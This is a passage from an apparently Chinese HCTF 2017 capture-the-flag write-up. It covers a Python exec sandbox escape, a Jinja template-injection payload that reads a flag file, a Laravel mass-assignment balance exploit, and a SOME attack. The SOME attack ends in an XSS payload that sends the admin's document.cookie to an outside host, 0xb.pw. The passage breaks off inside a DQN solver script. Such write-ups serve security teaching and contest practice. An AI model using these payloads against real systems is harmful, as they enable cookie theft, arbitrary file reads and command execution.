punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2.exec&#x6784;&#x9020;&#x7ED5;&#x8FC7;&apos;os&apos;&#x6267;&#x884C;os&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;</p> <pre><code>`a<span class="token operator">=</span><span class="token string">&apos;import\x0co&apos;</span><span class="token operator">+</span><span class="token string">&apos;s;o&apos;</span><span class="token operator">+</span><span class="token string">&apos;s.system(\&apos;ls${IFS}/\&apos;)&apos;</span><span class="token punctuation">;</span>exec<span class="token punctuation">(</span>a<span class="token punctuation">)</span>`</code></pre><p>3.&#x901A;&#x8FC7;request.cookies</p> <pre><code>    <span class="token constant">Url</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>repeater<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span><span class="token operator">?</span>secret<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>request<span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cattr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cattr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>mro<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>clast<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cattr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sub<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cattr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>getitem<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">%</span><span class="token number">0</span>cattr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>read<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
    <span class="token constant">Cookie</span><span class="token punctuation">:</span> file<span class="token operator">=</span><span class="token operator">/</span>h3h3_1s_your_flag<span class="token operator">/</span>flag<span class="token punctuation">;</span><span class="token keyword">class</span><span class="token operator">=</span>__class__<span class="token punctuation">;</span>mro<span class="token operator">=</span>__mro__<span class="token punctuation">;</span>sub<span class="token operator">=</span>__subclasses__<span class="token punctuation">;</span>getitem<span class="token operator">=</span>__getitem__<span class="token punctuation">;</span>read<span class="token operator">=</span>read<span class="token punctuation">;</span></code></pre><h3 id="who-are-you">Who are you?</h3> <p>&#x8FDB;&#x5165;&#x754C;&#x9762;&#xFF0C;&#x53F3;&#x4E0A;&#x767B;&#x5F55;&#xFF0C;Steam &#x8D26;&#x53F7;&#x6388;&#x6743;&#x3002;</p> <p>&#x7136;&#x540E;&#x8FDB;<code><span class="token constant">Home</span></code>&#x53D1;&#x73B0;&#x6709;<code>infomation</code>&#x548C;<code>shop</code>&#x3002;<code>shop</code>&#x91CC;&#x53EF;&#x4EE5;&#x4E70;flag&#x63A8;&#x6D4B;&#x4F46;&#x663E;&#x793A;&#x4F59;&#x989D;&#x4E0D;&#x8DB3;&#x3002;</p> <p>&#x8D2D;&#x4E70;&#x52A8;&#x4F5C;&#x7684;URL&#x4E3A;<code>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>gogogo<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>shop<span class="token operator">/</span><span class="token number">3</span></code>&#xFF0C;&#x4FEE;&#x6539;3&#x4E3A;4&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8C03;&#x8BD5;&#x6A21;&#x5F0F;&#x6CA1;&#x5173;&#xFF0C;&#x6E90;&#x7801;&#x6CC4;&#x9732;&#x3002;</p> <pre><code>    <span class="token keyword">public</span> function buy<span class="token punctuation">(</span><span class="token constant">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$itemId</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">&gt;</span>route<span class="token punctuation">(</span><span class="token string">&apos;id&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$item</span> <span class="token operator">=</span> <span class="token constant">Item</span><span class="token punctuation">:</span><span class="token punctuation">:</span>find<span class="token punctuation">(</span><span class="token variable">$itemId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token operator">-</span><span class="token operator">&gt;</span>prize<span class="token punctuation">;</span>
            <span class="token variable">$balance</span> <span class="token operator">=</span> <span class="token constant">Info</span><span class="token punctuation">:</span><span class="token punctuation">:</span>find<span class="token punctuation">(</span><span class="token constant">Auth</span><span class="token punctuation">:</span><span class="token punctuation">:</span>id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span>amount<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$balance</span> <span class="token operator">&gt;=</span> <span class="token variable">$prize</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> view<span class="token punctuation">(</span><span class="token string">&apos;message&apos;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&apos;message&apos;</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$item</span><span class="token operator">-</span><span class="token operator">&gt;</span>note<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">return</span> view<span class="token punctuation">(</span><span class="token string">&apos;message&apos;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&apos;message&apos;</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">&apos;Sorry Sir! You don\&apos;t have enough money&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span></code></pre><p>&#x5F97;&#x77E5;&#x540E;&#x7AEF;&#x6846;&#x67B6;&#x4E3A; <code><span class="token constant">Laravel</span></code>&#xFF0C;&#x8D26;&#x6237;&#x4F59;&#x989D;&#x5B57;&#x6BB5;&#x540D;&#x4E3A;<code>amount</code>&#x3002;</p> <p>infomation&#x9875;&#x5C1D;&#x8BD5;&#x628A;&#x8868;&#x5355;&#x4E2D;&#x7684;name&#x5B57;&#x6BB5;&#x6539;&#x6210;amount&#x5B57;&#x6BB5;&#x5E76;&#x63D0;&#x4EA4;&#xFF0C;&#x5373;&#x53EF;&#x5145;&#x503C;&#x3002;</p> <p>&#x8D2D;&#x4E70;&#x62FF;&#x5230;<code>flag&#xFF1A;hctf<span class="token punctuation">{</span>csgo_is_best_fps_game_dA3jf<span class="token punctuation">}</span></code>&#x3002;</p> <p>&#x63A8;&#x6D4B;&#x6CA1;&#x6709;&#x9650;&#x5B9A;&#x63D0;&#x4EA4;&#x8868;&#x5355;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x53CD;&#x63A8;&#x540E;&#x7AEF;&#x4EE3;&#x7801;&#x53EF;&#x80FD;&#x4E3A;&#x3002;</p> <pre><code>    <span class="token keyword">public</span> function update<span class="token punctuation">(</span><span class="token constant">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token constant">Info</span><span class="token punctuation">:</span><span class="token punctuation">:</span>where<span class="token punctuation">(</span><span class="token string">&apos;id&apos;</span><span class="token punctuation">,</span> <span class="token constant">Auth</span><span class="token punctuation">:</span><span class="token punctuation">:</span>id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span>update<span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">&gt;</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre><p>Laravel &#x4F7F;&#x7528;update&#x65B9;&#x6CD5;&#x6279;&#x91CF;&#x8D4B;&#x503C;&#x65F6;&#x5E94;&#x5728;Model&#x4E2D;&#x58F0;&#x660E;fillable&#x767D;&#x540D;&#x5355;&#x6216;&#x8005;guard&#x9ED1;&#x540D;&#x5355;&#x9650;&#x5236;&#x53C2;&#x6570;&#xFF0C;&#x6216;&#x8005;&#x4F7F;&#x7528;<code><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">&gt;</span>only<span class="token punctuation">(</span><span class="token punctuation">)</span></code>&#x6765;&#x9650;&#x5236;&#x3002;</p> <h3 id="deserted-place">Deserted place</h3> <pre><code>    <span class="token constant">Deserted</span> place

    <span class="token constant">Description</span> 
    maybe nothing here 
    flag <span class="token keyword">in</span> admin cookie
    <span class="token constant">Now</span> <span class="token constant">Score</span> <span class="token number">820.35</span>
    <span class="token constant">Team</span> solved <span class="token number">3</span></code></pre><p>&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x6765;&#x81EA;&#x4E8E;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x7279;&#x522B;&#x7684;&#x53EB;&#x505A;SOME&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x5168;&#x540D;<code><span class="token constant">Same</span> <span class="token constant">Origin</span> <span class="token builtin">Method</span> <span class="token constant">Execution</span></code>&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;2015&#x5E74;&#x88AB;&#x4EBA;&#x63D0;&#x51FA;&#x6765;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6267;&#x884C;&#x540C;&#x6E90;&#x73AF;&#x5883;&#x4E0B;&#x7684;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;&#xFF0C;2&#x5E74;&#x524D;&#x5C31;&#x6709;&#x4EBA;&#x505A;&#x4E86;&#x5206;&#x6790;&#x3002;</p> <p><a href="http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf"target="_blank">&#x539F;paper</a><br><a href="http://blog.safedog.cn/?p=13"target="_blank">http://blog.safedog.cn/?p=13</a><br><a href="https://lightless.me/archives/same-origin-method-exection.html"target="_blank">https://lightless.me/archives/same-origin-method-exection.html</a></p> <p>&#x8FD9;&#x91CC;&#x6211;&#x5C31;&#x4E0D;&#x8BA8;&#x8BBA;&#x5177;&#x4F53;&#x7684;SOME&#x653B;&#x51FB;&#xFF0C;&#x7A0D;&#x540E;&#x6211;&#x4F1A;&#x5728;&#x535A;&#x5BA2;&#x7B49;&#x5730;&#x65B9;&#x66F4;&#x65B0;&#x5177;&#x4F53;&#x7684;&#x5206;&#x6790;&#x3002;</p> <p>&#x56DE;&#x5230;&#x9898;&#x76EE;&#x3002;</p> <p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x6709;&#x9650;&#xFF1A; </p> <ul> <li>1&#x3001;&#x767B;&#x9646; </li> <li>2&#x3001;&#x6CE8;&#x518C; </li> <li>3&#x3001;&#x4FEE;&#x6539;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#xFF08;&#x4FEE;&#x6539;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x540E;&#x6309;&#x56DE;&#x8F66;&#x66F4;&#x65B0;&#x81EA;&#x5DF1;&#x7684;&#x4FE1;&#x606F;&#xFF09;&#x3001; </li> <li>4&#x3001;&#x83B7;&#x53D6;&#x968F;&#x673A;&#x4E00;&#x4E2A;&#x4EBA;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x628A;&#x5B83;&#x7684;&#x4FE1;&#x606F;&#x66F4;&#x65B0;&#x7ED9;&#x6211;&#x81EA;&#x5DF1;</li> </ul> <p>&#x7B80;&#x5355;&#x6D4B;&#x8BD5;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x9875;&#x9762;&#x5B58;&#x5728;self-xss&#xFF0C;&#x4F46;&#x95EE;&#x9898;&#x5C31;&#x5728;&#x4E8E;&#x600E;&#x4E48;&#x80FD;&#x66F4;&#x65B0;admin&#x7684;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x3002;</p> <p>&#x4ED4;&#x7EC6;&#x56DE;&#x987E;&#x7AD9;&#x5185;&#x7684;&#x5404;&#x79CD;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x53D1;&#x73B0;&#x6240;&#x6709;&#x7684;&#x66F4;&#x65B0;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x5F00;&#x542F;&#x5B50;&#x7A97;&#x53E3;&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002;</p> <p>edit.php&#x91CC;&#x9762;&#x6709;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;jsonp&#x7684;&#x63A5;&#x53E3;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x51FD;&#x6570;&#xFF0C;&#x7B80;&#x5355;&#x6D4B;&#x8BD5;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x6B63;&#x5219;&#x5339;&#x914D;&#x4E86;<code><span class="token punctuation">.</span>\w<span class="token operator">+</span></code>&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x8FD9;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x6267;&#x884C;&#x5DF2;&#x6709;&#x7684;js&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x770B;&#x540E;&#x53F0;&#x7684;&#x4EE3;&#x7801;&#x3002;</p> <pre><code>    <span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;callback&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
    preg_match<span class="token punctuation">(</span><span class="token string">&quot;/\w+/i&quot;</span><span class="token punctuation">,</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    echo <span class="token string">&quot;&lt;script&gt;&quot;</span><span class="token punctuation">;</span>
    echo <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">&quot;();&quot;</span><span class="token punctuation">;</span>
    echo <span class="token string">&quot;&lt;/script&gt;&quot;</span><span class="token punctuation">;</span></code></pre><p>&#x5DF2;&#x6709;&#x7684;&#x51FD;&#x6570;&#x4E00;&#x5171;&#x6709;3&#x4E2A;</p> <pre><code>    function <span class="token constant">UpdateProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        var username <span class="token operator">=</span> document<span class="token punctuation">.</span>getElementById<span class="token punctuation">(</span><span class="token string">&apos;user&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        var email <span class="token operator">=</span> document<span class="token punctuation">.</span>getElementById<span class="token punctuation">(</span><span class="token string">&apos;email&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        var message <span class="token operator">=</span> document<span class="token punctuation">.</span>getElementById<span class="token punctuation">(</span><span class="token string">&apos;mess&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>

        window<span class="token punctuation">.</span>opener<span class="token punctuation">.</span>document<span class="token punctuation">.</span>getElementById<span class="token punctuation">(</span><span class="token string">&quot;email&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">&quot;Email: &quot;</span><span class="token operator">+</span>email<span class="token punctuation">;</span>
        window<span class="token punctuation">.</span>opener<span class="token punctuation">.</span>document<span class="token punctuation">.</span>getElementById<span class="token punctuation">(</span><span class="token string">&quot;mess&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">&quot;Message: &quot;</span><span class="token operator">+</span>message<span class="token punctuation">;</span>

        console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token string">&quot;Update user profile success...&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        window<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    function <span class="token constant">EditProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        document<span class="token punctuation">.</span>onkeydown<span class="token operator">=</span>function<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>keyCode <span class="token operator">==</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token constant">UpdateProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    function <span class="token constant">RandomProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        setTimeout<span class="token punctuation">(</span><span class="token string">&apos;UpdateProfile()&apos;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre><p>&#x5982;&#x679C;&#x6267;&#x884C;<code><span class="token constant">UpdateProfile</span></code>&#xFF0C;&#x7AD9;&#x5185;&#x5C31;&#x4F1A;&#x628A;&#x5B50;&#x7A97;&#x53E3;&#x7684;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x5230;&#x7236;&#x7A97;&#x53E3;&#x4E2D;&#x3002;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x6CA1;&#x529E;&#x6CD5;&#x63A7;&#x5236;&#x4FEE;&#x6539;&#x7684;&#x5185;&#x5BB9;&#x3002;</p> <p>&#x56DE;&#x987E;&#x7AD9;&#x5185;&#x903B;&#x8F91;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x70B9;&#x51FB;click me&#xFF0C;&#x9996;&#x5148;&#x8BF7;&#x6C42;<code><span class="token operator">/</span>edit<span class="token punctuation">.</span>php<span class="token operator">?</span>callback<span class="token operator">=</span><span class="token constant">RandomProfile</span></code>&#xFF0C;&#x7136;&#x540E;&#x8DF3;&#x8F6C;&#x81F3;&#x4EFB;&#x610F;<code>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>hctf<span class="token punctuation">.</span>com<span class="token operator">/</span>edit<span class="token punctuation">.</span>php<span class="token operator">?</span>callback<span class="token operator">=</span><span class="token constant">RandomProfile</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>xiaoming</code>&#xFF0C;&#x7136;&#x540E;&#x9875;&#x9762;&#x5173;&#x95ED;&#x5E76;&#xFF0C;&#x66F4;&#x65B0;&#x4FE1;&#x606F;&#x5230;&#x5F53;&#x524D;&#x7528;&#x6237;&#x4E0A;&#xFF0C;&#x5047;&#x8BBE;&#x8FD9;&#x91CC;user&#x662F;&#x6211;&#x4EEC;&#x8BBE;&#x5B9A;&#x7684;&#x8FD8;&#x6709;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x7684;user&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;admin&#x7684;&#x4FE1;&#x606F;&#x4E86;&#xFF0C;&#x4F46;&#xFF0C;&#x600E;&#x4E48;&#x80FD;&#x8BA9;admin&#x6253;&#x5F00;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x5462;&#xFF1F;</p> <p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E2A;&#xFF0C;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x6253;&#x5F00;<code>edit<span class="token punctuation">.</span>php<span class="token operator">?</span>callback<span class="token operator">=</span><span class="token constant">RandomProfile</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>xiaoming</code><br> <a href="http://static.zybuluo.com/LoRexxar/ik54i9k8irjz1biosk5xnunu/image.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/ik54i9k8irjz1biosk5xnunu/image.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x62A5;&#x9519;&#x4E86;&#xFF0C;&#x4E0D;&#x662F;&#x901A;&#x8FC7;open&#x6253;&#x5F00;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x5BFB;&#x627E;&#x4E0D;&#x5230;&#x9875;&#x9762;&#x5185;&#x7684;<code>window<span class="token punctuation">.</span>opener</code>&#x5BF9;&#x8C61;&#xFF0C;&#x4E5F;&#x5C31;&#x6CA1;&#x529E;&#x6CD5;&#x505A;&#x4EFB;&#x4F55;&#x4E8B;&#x3002;</p> <p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EA;&#x6709;&#x901A;&#x8FC7;SOME&#xFF0C;&#x624D;&#x80FD;&#x64CD;&#x4F5C;&#x540C;&#x6E90;&#x4E0B;&#x7684;&#x7236;&#x7A97;&#x53E3;&#xFF0C;&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5F97;&#x719F;&#x6089;&#x540C;&#x6E90;&#x7B56;&#x7565;&#xFF0C;&#x540C;&#x6E90;&#x7B56;&#x7565;&#x89C4;&#x5B9A;&#xFF0C;&#x53EA;&#x6709;&#x540C;&#x6E90;&#x4E0B;&#x7684;&#x9875;&#x9762;&#x624D;&#x80FD;&#x76F8;&#x4E92;&#x8BFB;&#x5199;&#xFF0C;&#x5982;&#x679C;&#x901A;&#x8FC7;<code>windows<span class="token punctuation">.</span>open</code>&#x6253;&#x5F00;&#x7684;&#x9875;&#x9762;&#x662F;&#x540C;&#x6E90;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>window<span class="token punctuation">.</span>opener</code>&#x5BF9;&#x8C61;&#x6765;&#x64CD;&#x4F5C;&#x7236;&#x5B50;&#x7A97;&#x53E3;&#x3002;</p> <p>&#x800C;SOME&#x5C31;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x79CD;&#x7279;&#x6027;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x540C;&#x6E90;&#x4E0B;&#x7684;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;&#x3002;</p> <p>&#x6700;&#x7EC8;payload&#xFF1A;</p> <p>vps, 1.html</p> <pre><code>    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
        function start_some<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            window<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">&quot;2.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            location<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;http://desert.2017.hctf.io/user.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        setTimeout<span class="token punctuation">(</span>start_some<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span></code></pre><p>vps, 2.html</p> <pre><code>    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
        function attack<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            location<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;http://desert.2017.hctf.io/edit.php?callback=RandomProfile&amp;user=lorexxar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        setTimeout<span class="token punctuation">(</span>attack<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span></code></pre><p>&#x5728;lorexxar&#x8D26;&#x6237;&#x7684;message&#x91CC;&#x6DFB;&#x52A0;payload</p> <pre><code>    <span class="token operator">&lt;</span>img src<span class="token operator">=</span>&quot;\&quot; onerror<span class="token operator">=</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">&apos;http://0xb.pw?cookie=&apos;</span><span class="token operator">%</span><span class="token number">2</span>bdocument<span class="token punctuation">.</span>cookie<span class="token operator">&gt;</span></code></pre><p>getflag!</p> <h3 id="a-true-man-can-play-a-palo-one-hundred-time">A true man can play a palo one hundred time</h3> <h4 id="&#x9898;&#x76EE;&#x8BF4;&#x660E;">&#x9898;&#x76EE;&#x8BF4;&#x660E;</h4> <pre><code>    <span class="token constant">Question</span>
    <span class="token constant">Now</span> you have a balance palo<span class="token punctuation">.</span>&#x2028;<span class="token constant">You</span> can move it left <span class="token keyword">or</span> right<span class="token punctuation">.</span>&#x2028;<span class="token constant">Just</span> play hundred time on it<span class="token punctuation">.</span>&#x2028;
    <span class="token constant">Description</span>
    <span class="token constant">Get</span> request receive two params 
        <span class="token number">1.</span>  move<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">or</span> <span class="token number">1</span>
        <span class="token number">2.</span>  id<span class="token punctuation">,</span> just your token
    <span class="token constant">Observation</span>

        <span class="token number">1.</span>  pole position x
        <span class="token number">2.</span>  a value depend on x
        <span class="token number">3.</span>  pole deviate from center &#xCE;&#xB8;
        <span class="token number">4.</span>  a value depend on &#xCE;&#xB8;
    <span class="token constant">Why</span> you failed
    &#xCE;&#xB8; <span class="token keyword">or</span> x <span class="token operator">&gt;</span> a certain value</code></pre><p>&#x603B;&#x800C;&#x8A00;&#x4E4B;&#x5C31;&#x662F;&#x4E2A;&#x73A9;&#x68D2;&#x5B50;&#x7684;&#x6E38;&#x620F;(&#x96FE;&#x3002;<br>&#x4E4B;&#x6240;&#x4EE5;&#x51FA;&#x73B0;&#x5728;&#x6700;&#x540E;&#x4E00;&#x9053;&#x8BF7;&#x53BB;&#x95EE;&#x5173;&#x5361;&#x89C4;&#x5219;&#x7684;&#x8BBE;&#x8BA1;&#x8005;&#x3002;<br>&#x56E0;&#x4E3A;ctf&#x672C;&#x6765;&#x4E0D;&#x5E94;&#x8BE5;&#x51FA;&#x73B0;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x6709;&#x610F;&#x628A;&#x8FD9;&#x9898;&#x8BBE;&#x8BA1;&#x5F97;&#x7B80;&#x5355;&#x4E86;&#x4E00;&#x70B9;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;ctf&#x771F;&#x662F;&#x4E0D;&#x8BB2;&#x9053;&#x7406;&#xFF0C;&#x4E5F;&#x5BFC;&#x81F4;&#x8FD9;&#x9053;&#x9898;&#x88AB;&#x5C11;&#x91CF;&#x975E;&#x9884;&#x671F;&#x3002;</p> <p>&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#x5F3A;&#x5316;&#x5B66;&#x4E60;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x751A;&#x81F3;&#x4E0D;&#x9700;&#x8981;&#x5F3A;&#x5316;&#x5B66;&#x4E60;&#x53BB;&#x89E3;&#x3002;</p> <h4 id="dqn&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;">DQN&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#x5B9A;&#x4E49;</h4> <pre><code>import numpy as np
import tensorflow as tf
import requests
import math

<span class="token keyword">class</span> <span class="token class-name">DeepQNetwork</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> \_\_init\_\_<span class="token punctuation">(</span>
            <span class="token keyword">self</span><span class="token punctuation">,</span>
            n_actions<span class="token punctuation">,</span>
            n_features<span class="token punctuation">,</span>
            learning_rate<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">,</span>
            reward_decay<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>
            e_greedy<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>
            replace\_target\_iter<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">,</span>
